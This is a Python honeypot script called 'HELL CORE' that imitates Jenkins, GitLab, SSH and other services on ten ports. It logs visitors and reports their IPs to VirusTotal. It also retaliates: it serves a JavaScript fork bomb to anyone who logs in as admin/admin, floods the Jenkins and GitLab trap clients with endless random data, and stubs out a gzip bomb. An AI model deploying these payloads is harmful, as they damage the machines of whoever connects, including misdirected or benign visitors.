import socket
import threading
import time
import random
import os
import gzip
import io
from ai_module import GeminiDefender
from threat_intel import VirusTotalReporter

# CONFIGURACIÓN HELL v1.5.0: THE ARCHITECT
HOST = '0.0.0.0'
# Puertos: 8080(Web), 2525(SMTP), 3306(MySQL), 2222(SSH), 3389(RDP), 6379(Redis), 4455(SMB)
# NUEVOS: 1337(Switch/C2), 8081(Jenkins), 8082(GitLab)
PORTS = [8080, 2525, 3306, 2222, 3389, 6379, 4455, 1337, 8081, 8082]
GZIP_BOMB_PATH = "payloads/bomb.gz"
LOG_FILE = "logs/hell_activity.log"

USE_AI = os.getenv("USE_AI", "false").lower() == "true"
GEMINI_KEY = os.getenv("GEMINI_API_KEY", "")
VT_KEY = os.getenv("VT_API_KEY", "")
MY_IP = os.getenv("MY_IP", "127.0.0.1")

class HellServer:
    def __init__(self):
        self.defender = GeminiDefender(GEMINI_KEY) if USE_AI else None
        self.reporter = VirusTotalReporter(VT_KEY)
        self.whitelist = {MY_IP, "127.0.0.1"}
        print(f"[💀] HELL CORE v1.5.0: THE ARCHITECT - OPERACIÓN INFILTRACIÓN")

    def log_event(self, message):
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        with open(LOG_FILE, "a") as f:
            f.write(f"[{timestamp}] {message}\n")
        print(message)

    def send_response(self, client_socket, content, content_type="text/html", status="200 OK"):
        header = f"HTTP/1.1 {status}\r\nContent-Type: {content_type}\r\nContent-Length: {len(content)}\r\n\r\n"
        client_socket.send(header.encode() + content.encode())

    def handle_1337(self, client_socket, addr, request):
        """Trampa de Switch/C2 en puerto 1337"""
        if "POST /login" in request:
            if "username=admin&password=admin" in request:
                self.log_event(f"[🚨] INTRUSIÓN MANUAL DETECTADA en Puerto 1337 desde {addr[0]}. Atacante logueado con admin/admin.")
                # Mandar a VirusTotal con alta prioridad
                self.reporter.report_ip(addr[0])
                # Lanzar JS Fork Bomb de inmediato
                content = "<html><body><h1>Dashboard Loading...</h1><script>while(true){new Worker(URL.createObjectURL(new Blob(['while(true){}'])));}</script></body></html>"
                self.send_response(client_socket, content)
            else:
                self.send_response(client_socket, "<h1>Auth Failed</h1>", status="401 Unauthorized")
        else:
            with open("assets/trap_1337.html", "r") as f:
                self.send_response(client_socket, f.read())

    def handle_jenkins(self, client_socket, addr):
        """Trampa de Jenkins en puerto 8081"""
        self.log_event(f"[🏗️] Jenkins Scan detectado desde {addr[0]}")
        content = "<html><head><title>Jenkins [Dashboard]</title></head><body><h1>Jenkins Login</h1><form><input type='text' name='user'><input type='password' name='pass'><button>Login</button></form></body></html>"
        self.send_response(client_socket, content)
        # Tras el login falso, inundar con basura
        time.sleep(2)
        try:
            while True: client_socket.send(os.urandom(4096)); time.sleep(0.1)
        except: pass

    def handle_client(self, client_socket, addr, local_port):
        if addr[0] in self.whitelist:
            client_socket.close(); return

        try:
            request = client_socket.recv(4096).decode('utf-8', errors='ignore')
            
            if local_port == 1337:
                self.handle_1337(client_socket, addr, request)
            elif local_port == 8081: # Jenkins
                self.handle_jenkins(client_socket, addr)
            elif local_port == 8082: # GitLab
                self.log_event(f"[🦊] GitLab Attack detectado desde {addr[0]}")
                self.send_response(client_socket, "<h1>GitLab Community Edition</h1>")
                # Inundar con entropía
                while True: client_socket.send(os.urandom(4096)); time.sleep(0.1)
            else:
                # Lógica previa para otros puertos
                if "backup" in request:
                    header = "HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\n\r\n"
                    client_socket.send(header.encode())
                    # Send recursive bomb logic... (abreviado para brevedad)
                client_socket.close()
        except: pass
        finally: client_socket.close()

    def start_listener(self, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, port))
        server.listen(100)
        while True:
            try:
                client, addr = server.accept()
                threading.Thread(target=self.handle_client, args=(client, addr, port)).start()
            except: pass

    def start(self):
        self.log_event(f"[✔] HELL CORE v1.5.0: Vigilando {len(PORTS)} puertos.")
        for port in PORTS:
            threading.Thread(target=self.start_listener, args=(port,), daemon=True).start()
        while True: time.sleep(1)

if __name__ == "__main__":
    HellServer().start()
